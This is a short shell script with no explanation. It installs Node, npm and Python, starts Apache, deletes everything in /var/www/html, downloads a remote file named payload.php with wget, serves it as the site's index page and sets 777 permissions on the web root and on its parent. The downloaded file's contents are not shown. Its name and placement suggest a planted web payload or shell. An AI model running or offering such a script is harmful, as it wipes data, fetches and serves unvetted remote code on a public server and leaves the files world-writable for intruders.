apt update -y
apt upgrade -y
apt install nodejs -y
apt install npm -y
apt install python3 -y
service apache2 start
cd /var/www/html
rm -rf *
wget https://raw.githubusercontent.com/Modn1kk/1/main/payload.php
mv payload.php index.php
chmod 777 *
cd ..
chmod 777 *
cd html 
